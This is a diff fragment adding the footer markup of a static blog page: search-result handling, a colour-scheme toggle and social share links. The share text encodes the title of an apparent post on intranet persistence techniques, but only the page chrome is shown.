+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81(%E4%BA%8C)-%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%26RustDesk%26GotoHTTP%26%E9%BB%84%E9%87%91%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE + '&url=' + http%3A%2F%2Fexample.com%2Fposts%2Fa5dc2208%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/posts/a5dc2208/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
